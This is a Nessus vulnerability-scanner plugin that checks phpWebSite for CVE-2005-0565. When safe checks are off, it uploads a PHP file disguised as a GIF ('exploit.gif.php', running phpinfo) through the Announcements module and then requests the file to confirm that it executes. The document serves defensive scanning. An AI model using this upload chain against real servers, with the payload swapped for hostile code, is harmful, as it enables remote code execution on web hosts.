#
# (C) Tenable Network Security
#


  desc["english"] = "
Synopsis : 

The remote web server contains a PHP script that allows
for arbitrary code execution.

Description :

The remote host is running a version of phpWebSite in which the
Announcements module allows a remote attacker to both upload PHP
scripts disguised as image files and later run them using the
permissions of the web server user. 

See also : 

http://marc.theaimsgroup.com/?l=bugtraq&m=110928565530828&w=2
http://phpwebsite.appstate.edu/index.php?module=announce&ANN_id=922&ANN_user_op=view

Solution : 

Apply the security patch referenced in the vendor advisory above or
upgrade to version 0.10.1 or later.

Risk factor : 

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";


if (description) {
  script_id(17223);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2005-0565");
  script_bugtraq_id(12653);

  name["english"] = "phpWebSite Arbitrary PHP File Upload as Image File Vulnerability";
  script_name(english:name["english"]);
 
  script_description(english:desc["english"]);
 
  summary["english"] = "Detects arbitrary PHP file upload as image file vulnerability in phpWebSite";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencies("phpwebsite_detect.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Check each installed instance, stopping if we find a vulnerability.
install = get_kb_item(string("www/", port, "/phpwebsite"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  ver = matches[1];
  dir = matches[2];

  url = "/index.php";
  url_args = "module=announce&ANN_user_op=submit_announcement";
  req = http_get(item:dir + url + "?" + url_args, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If file uploads are supported....
  if ('<input type="file" name="ANN_image"' >< res) {

    # If safe_checks are enabled, rely on the version number alone.
    if (safe_checks()) {
      if (ver =~ "^0\.([0-9]\.|10\.0$)") {
        security_hole(port);
        exit(0);
      }
    }
    # Otherwise, try to exploit it.
    else {
      #  Grab the session cookie.
      pat = "Set-Cookie: (.+); path=";
      matches = egrep(pattern:pat, string:res);
      if (matches) {
        foreach match (split(matches)) {
          match = chomp(match);
          cookie = eregmatch(pattern:pat, string:match);
          if (!isnull(cookie)) {
            cookie = cookie[1];
            break;
          }
        }
      }

      # Open a ticket as long as we have a session cookie.
      if (cookie) {
        boundary = "bound";
        req = string(
          "POST ",  dir, url, " HTTP/1.1\r\n",
          "Host: ", get_host_name(), "\r\n",
          "Cookie: ", cookie, "\r\n",
          "Content-Type: multipart/form-data; boundary=", boundary, "\r\n"
          # nb: we'll add the Content-Length header and post data later.
        );
        boundary = string("--", boundary);
        postdata = string(
          boundary, "\r\n", 
          'Content-Disposition: form-data; name="module"', "\r\n",
          "\r\n",
          "announce\r\n",

          boundary, "\r\n", 
          'Content-Disposition: form-data; name="ANN_user_op"', "\r\n",
          "\r\n",
          "save\r\n",

          boundary, "\r\n", 
          'Content-Disposition: form-data; name="ANN_subject"', "\r\n",
          "\r\n",
          "Image Upload Test\r\n",

          boundary, "\r\n", 
          'Content-Disposition: form-data; name="ANN_summary"', "\r\n",
          "\r\n",
          "Image uploads are possible!\r\n",

          boundary, "\r\n", 
          'Content-Disposition: form-data; name="ANN_body"', "\r\n",
          "\r\n",
          "See attached image.\r\n",

          boundary, "\r\n", 
          'Content-Disposition: form-data; name="ANN_image"; filename="exploit.gif.php"', "\r\n",
          "Content-Type: image/gif\r\n",
          "\r\n",
          # NB: This is the actual exploit code; you could put pretty much
          #     anything you want here.
          "<? phpinfo() ?>\r\n",

          boundary, "\r\n", 
          'Content-Disposition: form-data; name="ANN_alt"', "\r\n",
          "\r\n",
          "empty\r\n",

          boundary, "--", "\r\n"
        );
        req = string(
          req,
          "Content-Length: ", strlen(postdata), "\r\n",
          "\r\n",
          postdata
        );
        res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
        if (res == NULL) exit(0);

        # Run the attachment we just uploaded.
        url = string(dir, "/images/announce/exploit.gif.php");
        req = http_get(item:url, port:port);
        res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
        if (res == NULL) exit(0);

        # If we could run it, there's a problem.
        if ("PHP Version" >< res) {
          desc = str_replace(
            string:desc["english"],
            find:"See also :",
            replace:string(
              "**** Nessus has successfully exploited this vulnerability by uploading\n",
              "**** an image file with PHP code that reveals information about the\n",
              "**** PHP configuration on the remote host. The file is located under\n",
              "**** the web server's document directory as:\n",
              "****          ", url, "\n",
              "**** You are strongly encouraged to delete this attachment as soon as\n",
              "**** possible as it can be run by anyone who accesses it remotely.\n",
              "\n",
              "See also :"
            )
          );
          security_hole(port:port, data:desc);
          exit(0);
        }
      }
    }
  }
}
